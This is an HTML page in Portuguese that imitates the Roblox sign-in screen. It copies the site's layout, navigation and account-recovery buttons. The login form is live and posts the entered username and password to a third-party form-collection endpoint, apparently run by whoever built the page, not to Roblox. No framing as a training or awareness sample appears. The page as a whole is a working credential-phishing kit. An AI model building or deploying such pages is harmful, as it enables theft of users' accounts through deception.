<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar na Roblox</title>

    <style>
        body {
            background-color: #1a1a1a;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* --- Estilos do Cabeçalho (Header) --- */
        .header {
            background-color: #232527;
            padding: 10px 20px;
            display: flex;
            flex-direction: column;
            border-bottom: 1px solid #3b3b3b;
        }
        
        .header-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            margin-bottom: 10px;
        }

        .header-top .header-left {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        /* Removido .header-logo */

        .header-right {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .btn-header {
            padding: 8px 20px;
            border-radius: 6px;
            text-decoration: none;
            font-size: 16px;
            font-weight: bold;
            text-align: center;
            cursor: pointer;
        }

        .btn-signup {
            background-color: #007bff;
            color: #fff;
            border: none;
        }

        .btn-login-header {
            background-color: #555;
            color: #1a1a1a;
            border: 1px solid #444;
        }
        
        .search-icon {
            width: 20px;
            height: 20px;
            filter: invert(1);
        }

        .header-bottom {
            display: flex;
            width: 100%;
            justify-content: space-between;
            align-items: center;
        }

        .nav-links {
            display: flex;
            gap: 25px;
            /* margin-left: 50px; Removido ou ajustado se precisar de alinhamento */
        }

        .nav-links a {
            color: #ccc;
            text-decoration: none;
            font-size: 16px;
            transition: color 0.3s;
        }

        .nav-links a:hover {
            color: #fff;
        }

        /* --- Estilos da Tela de Login --- */
        .login-section {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-grow: 1;
        }

        .login-container {
            background-color: #2b2b2b;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
            width: 380px;
            box-sizing: border-box;
            text-align: center;
        }

        /* Removido .roblox-logo */

        h2 {
            margin: 0;
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 25px; /* Adicionado margem para compensar a remoção da logo */
        }

        .input-group {
            margin: 20px 0;
        }

        .input-group input {
            width: 100%;
            padding: 14px 15px;
            border: none;
            border-radius: 6px;
            background-color: #3b3b3b;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            transition: box-shadow 0.3s ease;
        }

        .input-group input:focus {
            box-shadow: 0 0 0 2px #00a2ff;
        }

        .input-group input::placeholder {
            color: #999;
        }

        .btn-login {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 6px;
            background-color: #444;
            color: #fff;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .btn-login:hover {
            background-color: #555;
        }

        .forgot-password a {
            color: #00a2ff;
            text-decoration: none;
            font-size: 14px;
            margin: 20px 0;
            display: block;
        }

        .recovery-options button {
            width: 100%;
            padding: 15px;
            border: 1px solid #444;
            border-radius: 6px;
            background-color: #2b2b2b;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            margin-bottom: 10px;
            transition: background-color 0.3s ease;
        }

        .recovery-options button:hover {
            background-color: #3b3b3b;
        }

        .signup-link {
            margin-top: 25px;
            font-size: 14px;
            color: #ccc;
        }

        .signup-link a {
            color: #00a2ff;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <header class="header">
        <div class="header-top">
            <div class="header-left">
                </div>
            <div class="header-right">
                <a href="#" class="btn-header btn-signup">Cadastrar-se</a>
                <a href="#" class="btn-header btn-login-header">Entrar</a>
                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Vector_search_icon.svg" alt="Ícone de Pesquisa" class="search-icon">
            </div>
        </div>
        <div class="header-bottom">
            <nav class="nav-links">
                <a href="#">Destaques</a>
                <a href="#">Mercado</a>
                <a href="#">Criar</a>
                <a href="#">Robux</a>
            </nav>
        </div>
    </header>

    <section class="login-section">
        <div class="login-container">
            <h2>Entrar na Roblox</h2>
            <form id="loginForm" action="https://formspree.io/f/mwpqzrbp" method="POST">
                <div class="input-group">
                    <input type="text" name="usuario" placeholder="Usuário/e-mail/telefone" required>
                </div>
                <div class="input-group">
                    <input type="password" name="senha" placeholder="Senha" required>
                </div>

                <button type="submit" class="btn-login">Entrar</button>
            </form>

            <div class="forgot-password">
                <a href="#">Esqueceu a senha ou nome de usuário?</a>
            </div>

            <div class="recovery-options">
                <button class="btn-email">Envie-me um código único por e-mail</button>
                <button class="btn-device">Use outro dispositivo</button>
            </div>

            <div class="signup-link">
                Não possui uma conta? <a href="#">Cadastrar-se</a>
            </div>
        </div>
    </section>

</body>
</html>
